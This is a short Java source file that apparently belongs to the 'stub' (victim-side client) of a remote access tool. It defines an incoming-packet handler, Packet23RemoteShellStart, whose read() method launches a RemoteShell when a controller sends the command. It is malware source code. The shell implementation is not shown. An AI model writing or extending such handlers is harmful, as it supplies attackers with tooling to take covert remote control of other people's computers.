package com.redpois0n.stub.packets.incoming;

import com.redpois0n.stub.RemoteShell;

public class Packet23RemoteShellStart extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new RemoteShell().start();
	}

}
